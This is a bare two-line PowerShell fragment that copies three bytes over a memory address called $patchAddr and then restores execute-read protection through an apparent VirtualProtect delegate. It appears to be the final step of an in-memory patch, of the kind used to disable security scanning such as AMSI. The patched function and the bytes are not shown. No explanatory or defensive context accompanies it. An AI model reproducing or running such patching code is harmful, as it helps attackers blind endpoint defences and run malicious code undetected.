[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $patchAddr, 3)

$vp.Invoke($patchAddr, 3, 0x20, [ref]$oldProtectionBuffer)
